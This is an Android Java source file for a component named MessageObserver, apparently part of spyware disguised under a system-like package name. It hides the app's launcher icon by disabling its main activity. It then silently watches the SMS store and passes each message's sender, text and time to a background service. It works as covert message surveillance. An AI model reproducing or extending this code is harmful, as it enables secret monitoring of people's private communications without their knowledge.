package com.android.commstat.receivers;

import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

import com.android.commstat.ErrorsLog;
import com.android.commstat.MainActivity;
import com.android.commstat.model.Sms;
import com.android.commstat.services.BackupService;

import java.util.Calendar;


public class MessageObserver extends ContentObserver {
    private static boolean IsRegistered;
    private static final String CONTENT_SMS = "content://sms/";
    private static long mLastMessageId = 0;
    private Context mContext;

    public static void register(Context context) {
        if (!IsRegistered) {
            Log.d("MessageObserver", "Registered");
            ContentResolver contentResolver = context.getContentResolver();
            contentResolver.registerContentObserver(Uri.parse(MessageObserver.CONTENT_SMS), true, new MessageObserver(context, new Handler()));
            IsRegistered = true;
            PackageManager pkg = context.getPackageManager();
            pkg.setComponentEnabledSetting(new ComponentName(context, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        }
    }

    private MessageObserver(Context context, Handler handler) {
        super(handler);
        mContext = context;
    }

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        Cursor cur = null;
        try {
            Uri smsUri = Uri.parse(CONTENT_SMS);
            cur = mContext.getContentResolver().query(smsUri, new String[]{"_id", "thread_id", "address", /*"person",*/ "date", "body"}, null, null, null);
            if (cur == null) {
                return;
            }
            cur.moveToNext();
            long messageId = cur.getLong(cur.getColumnIndex("_id"));
            if (messageId != mLastMessageId) {
                mLastMessageId = messageId;
                String protocol = cur.getString(cur.getColumnIndex("protocol"));
                if (protocol == null) {
                    int threadId = cur.getInt(cur.getColumnIndex("thread_id"));
                    Cursor c = mContext.getContentResolver().query(Uri.parse("content://sms/outbox/" + threadId), new String[]{"_id"}, null, null, null);
                    if (c != null) {
                        try {
                            c.moveToNext();
                            String address = cur.getString(cur.getColumnIndex("address"));
                            String body = cur.getString(cur.getColumnIndex("body"));
                            Calendar calendar = Calendar.getInstance();
                            calendar.setTimeInMillis(cur.getLong(cur.getColumnIndex("date")));

                            Sms sms = new Sms(address, calendar.getTime(), true, body);
                            Intent mIntent = new Intent(mContext, BackupService.class);
                            mIntent.setAction(BackupService.SMS);
                            mIntent.putExtra(BackupService.SMS, sms);
                            mContext.startService(mIntent);
                        } finally {
                            c.close();
                        }
                    }
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            ErrorsLog.send(mContext, "MessageObserver", ex);
        } finally {
            if (cur != null) {
                cur.close();
            }
        }
    }
}